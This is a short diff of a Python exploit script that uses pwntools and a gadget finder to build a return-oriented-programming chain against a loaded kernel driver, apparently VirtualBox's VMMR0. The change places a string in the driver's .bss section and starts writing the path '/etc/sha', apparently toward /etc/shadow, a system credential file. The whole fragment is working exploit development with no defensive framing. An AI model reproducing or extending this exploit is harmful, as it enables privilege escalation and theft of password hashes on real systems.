@@ -48,6 +48,7 @@ retq;                               VMMR0 + 0x01ea33
 import sys
 from pwn import *
 from unalignedrop.gadget_finder import gadget
+from unalignedrop.elf_sections import section
 
 # For some insane reason (probably due to how ELF works) when we load the
 # target_binary into memory in userspace.c everything is 0x40 above where it
@@ -126,7 +127,8 @@ def build(leak, gadget_file, sled_length):
     # Build a string in the .bss section of the target driver
     # the .bss section starts at the address the driver was loaded
     # We have to adjust because the gadget we have is rdi + 0x2a50
-    string_location = int(leak)
+    string_location = adjuster(section('.bss', gadget_file))
+    print('string_location:', hex(string_location))
 
     rop = write4(rop, gadget_file, adjuster, string_location, b'/etc')
     rop = write4(rop, gadget_file, adjuster, string_location + 4, b'/sha')
